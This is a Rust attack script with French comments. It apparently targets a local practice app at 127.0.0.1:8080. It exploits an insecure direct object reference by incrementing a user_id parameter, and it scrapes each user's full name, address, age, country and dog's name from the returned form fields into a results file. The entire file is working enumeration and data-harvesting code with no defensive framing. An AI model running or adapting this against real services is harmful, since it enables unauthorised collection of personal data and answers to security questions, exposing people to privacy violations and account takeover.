use reqwest::Client; // Importe la bibliothèque reqwest pour les requêtes HTTP
use std::error::Error; // Importe le trait Error pour la gestion des erreurs
use std::fs::File; // Importe File pour la gestion des fichiers
use std::io::Write; // Importe Write pour écrire dans les fichiers

// Point d'entrée asynchrone de l'application
#[tokio::main] // Macro pour exécuter la fonction main dans un runtime Tokio (pour les opérations asynchrones)
async fn main() -> Result<(), Box<dyn Error>> {
    let client = Client::new(); // Crée une nouvelle instance du client HTTP
    let base_url = "http://127.0.0.1:8080/my_infos"; // URL de base de l'API cible
    let mut user_id_to_target = 1; // Initialise l'ID utilisateur à 1, il sera incrémenté à chaque itération

    println!("[+] Démarrage de la tentative de récupération d'infos...");

    // Boucle infinie qui s'arrêtera lorsqu'un utilisateur "inconnu" (nom vide) sera rencontré ou en cas d'erreur grave
    loop {
        let url_with_id = format!("{}?user_id={}", base_url, user_id_to_target); // Construit l'URL avec l'ID utilisateur actuel

        println!(
            "[+] Tentative de récupération d'infos pour l'ID utilisateur : {} ({})",
            user_id_to_target, url_with_id
        );

        // Envoie la requête GET à l'URL
        let res = client.get(&url_with_id).send().await;

        // Gère la réponse de la requête
        match res {
            Ok(response) => {
                let status = response.status(); // Récupère le statut HTTP de la réponse
                let body = response.text().await?; // Récupère le corps de la réponse en tant que texte

                // Si la requête a réussi (statut 2xx)
                if status.is_success() {
                    println!(
                        "[+] Données récupérées avec succès pour l'ID utilisateur {}.",
                        user_id_to_target
                    );

                    // Ouvre le fichier en mode append pour ajouter les résultats
                    let mut file = File::options()
                        .append(true)
                        .create(true) // Crée le fichier s'il n'existe pas
                        .open("infos_result.txt")?;

                    writeln!(
                        file,
                        "\n--- Infos pour l'ID utilisateur {}: ---",
                        user_id_to_target
                    )?;
                    writeln!(file, "Statut HTTP: {}", status)?;
                    writeln!(file, "URL ciblée: {}", url_with_id)?;
                    writeln!(file, "--- Infos extraites ---")?;

                    let mut found_any_data = false; // Flag pour vérifier si des données ont été trouvées (au moins un champ non vide)
                    let mut full_name_value: Option<String> = None; // Variable pour stocker le nom complet

                    // Parcourt chaque ligne du corps de la réponse pour extraire les informations
                    for line in body.lines() {
                        let mut info_found_in_line = false;
                        // On vérifie les champs spécifiques avec leur nom d'attribut
                        if line.contains("name=\"full_name\"") {
                            if let Some(value) = extract_value_from_input(line) {
                                println!("Nom complet: {}", value);
                                writeln!(file, "Nom complet: {}", value)?;
                                full_name_value = Some(value.clone()); // Stocke le nom complet
                                info_found_in_line = true;
                            } else {
                                // Si le champ full_name est présent mais sans attribut value, ou value est vide
                                full_name_value = Some("".to_string()); // Traiter comme une chaîne vide
                            }
                        } else if line.contains("name=\"address\"") {
                            if let Some(value) = extract_value_from_input(line) {
                                println!("Adresse: {}", value);
                                writeln!(file, "Adresse: {}", value)?;
                                info_found_in_line = true;
                            }
                        } else if line.contains("name=\"age\"") {
                            if let Some(value) = extract_value_from_input(line) {
                                println!("Âge: {}", value);
                                writeln!(file, "Âge: {}", value)?;
                                info_found_in_line = true;
                            }
                        } else if line.contains("name=\"country\"") {
                            if let Some(value) = extract_value_from_input(line) {
                                println!("Pays: {}", value);
                                writeln!(file, "Pays: {}", value)?;
                                info_found_in_line = true;
                            }
                        } else if line.contains("name=\"dog_name\"") {
                            if let Some(value) = extract_value_from_input(line) {
                                println!("Nom du chien: {}", value);
                                writeln!(file, "Nom du chien: {}", value)?;
                                info_found_in_line = true;
                            }
                        }

                        if info_found_in_line {
                            found_any_data = true;
                        }
                    }

                    // Vérifie si le nom complet est vide ou n'a pas été trouvé du tout
                    // Ce cas est interprété comme un utilisateur "inconnu"
                    if full_name_value.as_deref().unwrap_or("").is_empty() {
                        println!(
                            "[!] Nom complet vide ou non trouvé pour l'ID {}. Interprété comme 'Unknown'. Arrêt du scan.",
                            user_id_to_target
                        );
                        writeln!(file, "[!] Nom complet vide ou non trouvé. Interprété comme 'Unknown'.")?;
                        break; // Sort de la boucle
                    }


                    if !found_any_data {
                        println!("[!] Aucune information n'a été trouvée ou extraite des champs du formulaire pour l'ID utilisateur {}. Vérifiez que la page les affiche dans les attributs 'value'.", user_id_to_target);
                        writeln!(file, "[!] Aucune information n'a été trouvée ou extraite des champs du formulaire.")?;
                    }

                } else {
                    // Gère les autres codes de statut non-succès (e.g., 404, 500)
                    println!("[x] Échec de la récupération des données pour l'ID utilisateur {}. Statut: {}", user_id_to_target, status);
                    let mut file = File::options()
                        .append(true)
                        .create(true)
                        .open("infos_result.txt")?;
                    writeln!(file, "\n--- Échec de la récupération des infos pour l'ID utilisateur {}: ---", user_id_to_target)?;
                    writeln!(file, "Statut HTTP: {}", status)?;
                    writeln!(file, "Corps de la réponse: {}", body)?;
                    break; // Arrête la boucle en cas d'autres erreurs non gérées spécifiquement
                }
            }
            Err(e) => {
                // Gère les erreurs de connexion ou autres erreurs réseau
                println!(
                    "[x] Erreur lors de l'envoi de la requête pour l'ID utilisateur {}: {}",
                    user_id_to_target, e
                );
                break; // Arrête la boucle en cas d'erreur
            }
        }

        user_id_to_target += 1; // Incrémente l'ID utilisateur pour la prochaine itération
    }

    println!("\n[+] Scan terminé. Les résultats sont enregistrés dans infos_result.txt");

    Ok(()) // Indique que l'exécution s'est terminée avec succès
}

// Fonction utilitaire pour extraire la valeur d'un attribut 'value' dans une balise input HTML
fn extract_value_from_input(line: &str) -> Option<String> {
    // Cherche la chaîne "value=\""
    if let Some(start_index) = line.find("value=\"") {
        // Prend la partie de la ligne après "value=\""
        let after_value = &line[start_index + "value=\"".len()..];
        // Cherche le guillemet fermant après la valeur
        if let Some(end_index) = after_value.find("\"") {
            // Extrait la valeur entre les guillemets
            let value = &after_value[..end_index];
            return Some(value.to_string()); // Retourne la valeur sous forme de String
        }
    }
    None // Retourne None si "value=\"" ou le guillemet fermant n'est pas trouvé
}
